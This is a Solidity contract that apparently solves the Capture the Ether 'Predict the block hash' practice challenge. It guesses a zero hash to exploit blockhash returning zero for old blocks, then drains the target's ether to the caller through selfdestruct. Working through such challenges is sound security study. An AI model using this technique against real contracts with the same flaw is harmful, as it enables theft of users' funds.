// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "./PredictTheBlockHashChallenge.sol";

contract PredictTheBlockHashChallengeAttack {
    PredictTheBlockHashChallenge private target;

    function PredictTheBlockHashChallengeAttack(address _address) public {
        target = PredictTheBlockHashChallenge(_address);
    }

    function lockInGuess() public payable {
        require(msg.value == 1 ether);
        bytes32 hash = 0x0000000000000000000000000000000000000000000000000000000000000000;

        target.lockInGuess.value(1 ether)(hash);
    }

    function hack() external payable {
        target.settle();
        require(target.isComplete());

        // transfer all the remaining funds to the attacker
        selfdestruct(msg.sender);
    }

    //get the ether using fallback fn.
    function() public payable {}
}
